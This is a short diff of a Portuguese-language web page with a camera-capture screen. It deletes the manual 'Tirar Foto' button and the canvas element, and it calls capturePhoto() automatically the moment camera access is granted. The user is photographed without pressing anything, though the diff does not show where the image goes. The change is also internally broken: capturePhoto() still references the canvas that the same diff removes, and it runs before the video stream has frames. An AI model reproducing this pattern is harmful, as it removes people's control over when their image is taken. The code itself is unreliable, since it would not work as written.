@@ -90,8 +90,6 @@
         <div class="photo-container" id="photo-container">
             <h2>Capturar Foto</h2>
             <video id="video" width="100%" height="auto" autoplay></video>
-            <button onclick="capturePhoto()">Tirar Foto</button>
-            <canvas id="canvas" style="display:none;"></canvas>
         </div>
 
         <!-- Tela de Confirmação -->
@@ -153,13 +151,14 @@
             navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 document.getElementById('video').srcObject = stream;
+                capturePhoto(); // Captura a foto automaticamente
             })
             .catch(function(error) {
                 console.log("Erro ao acessar a câmera: ", error);
             });
         }
 
-        // Função para capturar a foto
+        // Função para capturar a foto automaticamente
         function capturePhoto() {
             var video = document.getElementById('video');
             var canvas = document.getElementById('canvas');
